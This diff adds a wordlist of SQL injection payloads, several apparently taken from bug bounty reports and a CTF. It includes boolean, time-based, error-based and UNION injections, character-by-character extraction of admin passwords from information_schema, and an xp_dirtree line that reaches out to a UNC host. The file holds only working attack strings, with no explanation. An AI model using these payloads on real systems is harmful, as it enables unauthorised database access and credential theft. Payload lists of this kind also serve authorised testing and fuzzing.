@@ -1,0 +1,97 @@
+' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) = 113-- -
+' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 113-- -
+' AND 1=1;--
+' OR '1'='1
+' OR sleep(5)='
+' UNION SELECT "' union select 1,2,'../api/user?username=grinch'#",1,2#
+' UNION SELECT "' union select 1,2,'../api/user?username=grincha$$%&password=%25'#",1,2#
+' UNION select 1, NULL, NULL;--
+' UNION select 1,NULL,NULL;--
+' UNION select null,null,'xyz.jpg'
+' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3 --
+' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c276f75725f7061746827202d2d20,2,3 --
+' and 1=0 union select 1 -- .
+' and 1=0 union select 1,2 -- .
+' and 1=0 union select 1,2,'../../' -- .
+' and 1=0 union select 1,2,'our_path' -- .
+' and 1=0 union select 1,2,3 -- .
+' and 1=0 union select SQLi_2,2,3 -- .
+' or ''='
+' or '1'='2
+' or (select sleep(15))-- -
+' or 1=1 --
+';declare @q varchar(99);set @q='\\target.com/random'; exec master.dbo.xp_dirtree @q;--
+'and%20substr(version(),1,1)='2'-- ==> will give you 200 OK
+'and%20substr(version(),2,1)='0'-- ==> will give you 200 OK
+'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa
+'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa
+-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
+-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username=grinchadmin%26password={}%' -- -",'12',1-- -
+-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -
+-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,1 -- -",'12',1-- -
+.../r3c0n_server_4fdk59/album?hash="-1' UNION ALL SELECT "-1' union all select NULL,NULL,'../api/endpoint'-- -",2,3-- -
+.../r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
+1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK
+1' UNION SELECT "' UNION SELECT 1,2,3'-- ","456","789"--
+1' UNION SELECT "1' ORDER BY 3-- ","456","789" --
+123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
+99' OR 1=1-- -
+99' OR 5=1-- -
+GET /r3c0n_server_4fdk59/album?hash=-4685' UNION ALL SELECT "1' UNION ALL SELECT \"1\",\"4\",\"/api/\"-- -","1","2" -- - //
+Jfjrir' union select 1,2,3,4 from admin;/*
+Jfjrir' union select 1,2,3,4;/*
+Jfjrir' union select 1,2,3;/*
+Jfjrir' union select 1,2;/*
+Jfjrir' union select 1;/*
+Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG
+Payload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**
+Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
+UNION ALL SELECT NULL,NULL,( UNION ALL SELECT NULL,NULL,NULL)-- -
+URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='
+a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
+admin' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="quiz" LIMIT 0,1),1,1))) = 97--
+admin' AND (length((select table_name from information_schema.tables where table_schema='quiz' limit 0,1))) = 5 --
+alice' OR 1=1--
+alice' || '1' ; && 1<=>0 && 1-1 && 1<=>1 && 1#
+asdasd' UNION ALL SELECT 1,1,1;/*
+curl -H 'Host: target.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://target.com/████.php?entity_type=restaurant&entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k
+grinch' AND 1=1;--
+grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
+grinch' or '1'='1
+grinch' or '1'='2
+grinch' or 1=( SELECT 1 FROM admin WHERE username like 'admi%' LIMIT 0,1) -- -
+grinch' or 1=( SELECT 1 FROM information_schema.columns WHERE table_name='admin' AND column_name like 'username%' LIMIT 0,1) -- -
+grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -
+grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'admin' LIMIT 0,1) -- -
+hax" OR (select 1 from admin)#
+hax" OR (select count(password) from admin)#
+https://target.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23
+https://target.com/r3c0n_server_4fdk59/album?hash=' UNION SELECT "' UNION select NULL,NULL,'xyz.jpg';--",NULL,NULL;--
+https://target.com/r3c0n_server_4fdk59/album?hash=-1' UNION ALL SELECT 1, 2, group_concat(album_id,",",id,",",photo,";\n") from photo-- -
+https://target.com/r3c0n_server_4fdk59/album?hash=-8436' UNION ALL SELECT NULL,NULL,GROUP_CONCAT(UNION ALL SELECT NULL,NULL,NULL) FROM information_schema.tables WHERE table_name like 'a%'-- -
+https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
+https://█████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@LANGID
+https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil
+https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil
+https://██████████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@nonexisting
+https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
+if(mid(@@version,1,1)=4
+if(mid(@@version,1,1)=5
+if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
+invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
+invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
+invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
+jdh34k' and 1=0 -- .
+jdh34k' and 1=0 union all select "1' and 1='1",2,3;--
+jdh34k' and 1=0 union all select "1' and 1=0 union all select 4,5,6;--;--",2,3;--
+jdh34k' and 1=0 union all select 1,2,3;--
+jdh34k' and 1=1 -- .
+myuniquename' or 1=1 --
+myuniquename' or 1=2 --
+pg_sleep(__30__)--
+select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1
+select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1
+select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1
+select count(*) from information_schema.tables where table_schema like "quiz" and table_name like "' + tmp_known + '%" limit 1
+test' AND (ascii(substr((SELECT password FROM quiz.admin LIMIT 0,1),1,1))) = 112--  -
+w31rd0' OR 1=1-- -
